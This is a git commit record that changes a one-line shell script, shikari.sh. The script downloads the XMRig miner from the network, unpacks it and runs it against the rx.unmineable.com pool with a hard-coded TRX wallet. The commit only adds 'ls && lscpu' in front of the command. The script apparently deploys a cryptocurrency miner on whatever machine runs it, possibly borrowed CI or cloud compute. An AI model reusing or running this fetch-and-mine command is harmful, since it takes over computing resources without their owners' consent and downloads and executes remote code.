3b44d09d810feb3cb8b19c23f95052929c34ec3d
Botmirror69 <92679061+Botmirror69@users.noreply.github.com>
2022-02-25 17:04:17 +0530

    Update shikari.sh

--- shikari.sh
+++ shikari.sh
@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz && tar xf xmrig-6.14.0-linux-x64.tar.gz && cd xmrig-6.14.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TF7XkqVKuqysTySWDfLG6Zh5zMnudNmxxQ.Shikari2 -p x --cpu 4
+ls && lscpu && wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz && tar xf xmrig-6.14.0-linux-x64.tar.gz && cd xmrig-6.14.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TF7XkqVKuqysTySWDfLG6Zh5zMnudNmxxQ.Shikari2 -p x --cpu 4
